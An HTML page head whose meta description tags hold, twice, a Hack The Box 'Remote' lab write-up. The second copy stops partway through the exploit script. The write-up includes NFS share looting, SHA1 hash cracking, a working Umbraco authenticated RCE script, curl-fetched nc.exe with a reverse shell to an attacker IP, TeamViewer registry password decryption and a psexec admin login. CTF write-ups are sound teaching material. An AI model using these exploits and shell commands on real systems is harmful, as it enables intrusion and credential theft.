@@ -1,0 +1,587 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Remote" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :) Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.180 remote.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 $ nmap -sV -sT -sC remote.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 05:30 EDT Nmap scan report for remote.htb (10.10.10.180) Host is up (0.27s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1119/tcp filtered bnetgame 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m12s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-22T09:34:15 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 268.43 seconds Enumeration (1) Even though Anonymous FTP login was allowed, there was no files on the ftp service on port 21 :( Moving on, we see a http service running port 80 so lets check that out. This website seems like its based on a web template but let’s continue crawling around… http://remote.htb/contact/: On this page was this button that brings me to a login page of a content management system (CMS) called Umbraco! We don’t have credentials to login with but I did find an exploit we can possibly use on this CMS. However, this exploit require us to be authenticated but we can keep this exploit for later on. Going back to the scan results, we see a large chuck of rpcbind information from port 111, but below that we see a mountd service running on port 2049 Using showmount, we can see what NFS (Network File Share) shares are available on the service. 1 2 3 $ showmount -e remote.htb Export list for remote.htb: /site_backups (everyone) Lets try mounting it on our machine: 1 2 $ mkdir /mnt/nfs $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs No output but I guess it worked? Lets see whats inside! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cd /mnt/nfs $ ls -al total 123 drwx------ 2 4294967294 4294967294 4096 Aug 15 11:12 . drwxr-xr-x 3 root root 4096 Aug 16 15:15 .. drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 App_Browsers drwx------ 2 4294967294 4294967294 4096 Feb 20 12:17 App_Data drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 App_Plugins drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 aspnet_client drwx------ 2 4294967294 4294967294 49152 Feb 20 12:16 bin drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Config drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 css -rwx------ 1 4294967294 4294967294 152 Nov 1 2018 default.aspx -rwx------ 1 4294967294 4294967294 89 Nov 1 2018 Global.asax drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Media drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 scripts drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Umbraco drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Umbraco_Client drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Views -rwx------ 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config This seem like a folder containing the contents of the Umbraco CMS. Since this files and folders could be a backup of the current Umbraco instance that is running, lets see if we can find any hard-coded configuration or credentials we can use. Digging around, I found a Umbraco.sdf under App_Data. Searching online, it says that this file was an SQL file containing the contents of the Umbraco CMS! Nice! However, this file is in binary but we can run strings on it and eyeball for information. 1 2 3 4 5 6 7 8 9 $ strings Umbraco.sdf | less ... Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 ... Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: admin and ssmith, but hash of admin@htb.local is in SHA1 while the hash of ssmith@htb.local is in HMACSHA256. HMACSHA256 needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the SHA1 hash online. https://crackstation.net/: Lets check if baconandcheese is still being used for the admin@htb.local account. After pressing “Login”, nothing appeared on webpage but we know that the login was successful. Remember the exploit we found just now? Lets see if this exploit works with our credentials that we found. Exploitation 1 2 3 4 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; k (most recent call last): File &quot;umbraco3.py&quot;, line 53, in &lt;module&gt; VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution # Date: 2020-03-28 # Exploit Author: Alexandre ZANNI (noraj) # Based on: https://www.exploit-db.com/exploits/46153 # Vendor Homepage: http://www.umbraco.com/ # Software Link: https://our.umbraco.com/download/releases # Version: 7.12.4 # Category: Webapps # Tested on: Windows IIS # Example: python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c ipconfig import requests import re import argparse from http.cookies import SimpleCookie from bs4 import BeautifulSoup parser = argparse.ArgumentParser(prog=&#39;exploit.py&#39;, description=&#39;Umbraco authenticated RCE&#39;, formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80)) parser.add_argument(&#39;-u&#39;, &#39;--user&#39;, metavar=&#39;USER&#39;, type=str, required=True, dest=&#39;user&#39;, help=&#39;username / email&#39;) parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, metavar=&#39;PASS&#39;, type=str, required=True, dest=&#39;password&#39;, help=&#39;password&#39;) parser.add_argument(&#39;-i&#39;, &#39;--host&#39;, metavar=&#39;URL&#39;, type=str, required=True, dest=&#39;url&#39;, help=&#39;root URL&#39;) parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, metavar=&#39;CMD&#39;, type=str, required=True, dest=&#39;command&#39;, help=&#39;command&#39;) parser.add_argument(&#39;-a&#39;, &#39;--arguments&#39;, metavar=&#39;ARGS&#39;, type=str, required=False, dest=&#39;arguments&#39;, help=&#39;arguments&#39;, default=&#39;&#39;) args = parser.parse_args() # Payload payload = &quot;&quot;&quot;\ &lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() { string cmd = &quot;%s&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &quot;%s&quot;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &quot;&quot;&quot; % (args.arguments, args.command) login = args.user password = args.password host = args.url # Process Login url_login = host + &quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot; loginfo = { &quot;username&quot;: login, &quot;password&quot;: password} s = requests.session() # START OF MODIFIED SECTION # r2 = s.post(url_login,json=loginfo) r2 = requests.post(url_login,json=loginfo) cookie = SimpleCookie() cookie.load(r2.headers[&quot;Set-Cookie&quot;]) for key,value in cookie.items(): cookie_obj = requests.cookies.create_cookie(name=key,value=value.value) s.cookies.set_cookie(cookie_obj) # END OF MODIFIED SECTION # Go to vulnerable web page url_xslt = host + &quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot; r3 = s.get(url_xslt) soup = BeautifulSoup(r3.text, &#39;html.parser&#39;) VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)[&#39;value&#39;] UMBXSRFTOKEN = s.cookies[&#39;UMB-XSRF-TOKEN&#39;] headers = {&#39;UMB-XSRF-TOKEN&#39;: UMBXSRFTOKEN} data = { &quot;__EVENTTARGET&quot;: &quot;&quot;, &quot;__EVENTARGUMENT&quot;: &quot;&quot;, &quot;__VIEWSTATE&quot;: VIEWSTATE, &quot;__VIEWSTATEGENERATOR&quot;: VIEWSTATEGENERATOR, &quot;ctl00$body$xsltSelection&quot;: payload, &quot;ctl00$body$contentPicker$ContentIdValue&quot;: &quot;&quot;, &quot;ctl00$body$visualizeDo&quot;: &quot;Visualize+XSLT&quot; } # Launch the attack r4 = s.post(url_xslt, data=data, headers=headers) # print(r4.text) # Filter output soup = BeautifulSoup(r4.text, &#39;html.parser&#39;) CMDOUTPUT = soup.find(id=&quot;result&quot;).getText() print(CMDOUTPUT) Now, lets test it out. 1 2 3 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; iis apppool\defaultapppool With RCE on the box, we can now upload our nc.exe to it and establish a reverse shell. 1 2 3 4 5 6 7 8 9 10 11 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c mkdir C:\\\\tmp&quot; $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c curl http://10.10.XX.XX/nc.exe &gt; C:\\\\tmp\\\\nc.exe&quot; $ nc -lvnp 1337 istening on [any] 1337 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; On our nc listener`, we catch our reverse shell. 1 2 3 4 5 6 7 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708 Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. c:\windows\system32\inetsrv&gt;whoami iis apppool\defaultapppool user.txt As the current user did not have a home directory, I had to resort to using where to find it. 1 2 3 4 c:\windows\system32\inetsrv&gt; where /R C:\ user.txt C:\Users\Public\user.txt c:\windows\system32\inetsrv&gt; type C:\Users\Public\user.txt cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets check whats installed on the system. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 c:\windows\system32\inetsrv&gt; dir &quot;C:\Program Files&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\Program Files 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 02/19/2020 04:04 PM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; internet explorer 02/23/2020 03:16 PM &lt;DIR&gt; Microsoft SQL Server 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/19/2020 04:04 PM &lt;DIR&gt; VMware 02/20/2020 07:46 AM &lt;DIR&gt; Windows Defender 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender Advanced Threat Protection 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; Windows Security 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 18 Dir(s) 19,394,420,736 bytes free c:\windows\system32\inetsrv&gt; dir &quot;C:\Program Files (x86)&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\Program Files (x86) 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 09/15/2018 03:28 AM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; Internet Explorer 02/23/2020 03:19 PM &lt;DIR&gt; Microsoft SQL Server 02/23/2020 03:15 PM &lt;DIR&gt; Microsoft.NET 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/20/2020 03:14 AM &lt;DIR&gt; TeamViewer 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 17 Dir(s) 19,394,396,160 bytes free “TeamViewer”? This definitely seem worth looking into. Maybe there are saved passwords? I couldn’t find any config files containing saved passwords so another location that stores configs is probably the registry. 1 2 3 4 5 6 7 8 9 c:\windows\system32\inetsrv&gt; reg query HKLM /s /k /f &quot;TeamViewer&quot; HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\TeamViewer 7 HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerConfiguration HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerSession HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TeamViewer7 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TeamViewer7 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TeamViewer7 End of search: 7 match(es) found HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer seems promising so lets check that out. 1 2 3 4 5 6 c:\windows\system32\inetsrv&gt; reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer&quot; /s ... HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7 ... SecurityPasswordAES REG_BINARY FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B ... Seems like I was right! Using this script from this link, I was able to retrieve the decrypted password. 1 2 3 4 5 6 7 8 9 10 $ python3 tv.py This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity. Read this blogpost if you haven&#39;t already : https://whynotsecurity.com/blog/teamviewer Please check below mentioned registry values and enter its value manually without spaces. &quot;SecurityPasswordAES&quot; OR &quot;OptionsPasswordAES&quot; OR &quot;SecurityPasswordExported&quot; OR &quot;PermanentPassword&quot; Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B Decrypted password is : !R3m0te! root.txt With !R3m0te!, lets check if we can get into the Administrator’s account. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python psexec.py &#39;Administrator:!R3m0te!@remote.htb&#39; Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on remote.htb..... [*] Found writable share ADMIN$ [*] Uploading file FNFPcETB.exe [*] Opening SVCManager on remote.htb..... [*] Creating service xGXs on remote.htb..... [*] Starting service xGXs..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :) Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.180 remote.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 $ nmap -sV -sT -sC remote.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 05:30 EDT Nmap scan report for remote.htb (10.10.10.180) Host is up (0.27s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1119/tcp filtered bnetgame 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m12s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-22T09:34:15 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 268.43 seconds Enumeration (1) Even though Anonymous FTP login was allowed, there was no files on the ftp service on port 21 :( Moving on, we see a http service running port 80 so lets check that out. This website seems like its based on a web template but let’s continue crawling around… http://remote.htb/contact/: On this page was this button that brings me to a login page of a content management system (CMS) called Umbraco! We don’t have credentials to login with but I did find an exploit we can possibly use on this CMS. However, this exploit require us to be authenticated but we can keep this exploit for later on. Going back to the scan results, we see a large chuck of rpcbind information from port 111, but below that we see a mountd service running on port 2049 Using showmount, we can see what NFS (Network File Share) shares are available on the service. 1 2 3 $ showmount -e remote.htb Export list for remote.htb: /site_backups (everyone) Lets try mounting it on our machine: 1 2 $ mkdir /mnt/nfs $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs No output but I guess it worked? Lets see whats inside! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cd /mnt/nfs $ ls -al total 123 drwx------ 2 4294967294 4294967294 4096 Aug 15 11:12 . drwxr-xr-x 3 root root 4096 Aug 16 15:15 .. drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 App_Browsers drwx------ 2 4294967294 4294967294 4096 Feb 20 12:17 App_Data drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 App_Plugins drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 aspnet_client drwx------ 2 4294967294 4294967294 49152 Feb 20 12:16 bin drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Config drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 css -rwx------ 1 4294967294 4294967294 152 Nov 1 2018 default.aspx -rwx------ 1 4294967294 4294967294 89 Nov 1 2018 Global.asax drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Media drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 scripts drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Umbraco drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Umbraco_Client drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Views -rwx------ 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config This seem like a folder containing the contents of the Umbraco CMS. Since this files and folders could be a backup of the current Umbraco instance that is running, lets see if we can find any hard-coded configuration or credentials we can use. Digging around, I found a Umbraco.sdf under App_Data. Searching online, it says that this file was an SQL file containing the contents of the Umbraco CMS! Nice! However, this file is in binary but we can run strings on it and eyeball for information. 1 2 3 4 5 6 7 8 9 $ strings Umbraco.sdf | less ... Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 ... Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: admin and ssmith, but hash of admin@htb.local is in SHA1 while the hash of ssmith@htb.local is in HMACSHA256. HMACSHA256 needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the SHA1 hash online. https://crackstation.net/: Lets check if baconandcheese is still being used for the admin@htb.local account. After pressing “Login”, nothing appeared on webpage but we know that the login was successful. Remember the exploit we found just now? Lets see if this exploit works with our credentials that we found. Exploitation 1 2 3 4 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; k (most recent call last): File &quot;umbraco3.py&quot;, line 53, in &lt;module&gt; VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution # Date: 2020-03-28 # Exploit Author: Alexandre ZANNI (noraj) # Based on: https://www.exploit-db.com/exploits/46153 # Vendor Homepage: http://www.umbraco.com/ # Software Link: https://our.umbraco.com/download/releases # Version: 7.12.4 # Category: Webapps # Tested on: Windows IIS # Example: python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c ipconfig import requests import re import argparse from http.cookies import SimpleCookie from bs4 import BeautifulSoup parser = argparse.ArgumentParser(prog=&#39;exploit.py&#39;, description=&#39;Umbraco authenticated RCE&#39;, formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80)) parser.add_argument(&#39;-u&#39;, &#39;--user&#39;, metavar=&#39;USER&#39;, type=str, required=True, dest=&#39;user&#39;, help=&#39;username / email&#39;) parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, metavar=&#39;PASS&#39;, type=str, required=True, dest=&#39;password&#39;, help=&#39;password&#39;) parser.add_argument(&#39;-i&#39;, &#39;--host&#39;, metavar=&#39;URL&#39;, type=str, required=True, dest=&#39;url&#39;, help=&#39;root URL&#39;) parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, metavar=&#39;CMD&#39;, type=str, required=True, dest=&#39;command&#39;, help=&#39;command&#39;) parser.add_argument(&#39;-a&#39;, &#39;--arguments&#39;, metavar=&#39;ARGS&#39;, type=str, required=False, dest=&#39;arguments&#39;, help=&#39;arguments&#39;, default=&#39;&#39;) args = parser.parse_args() # Payload payload = &quot;&quot;&quot;\ &lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() { string cmd = &quot;%s&quot;; 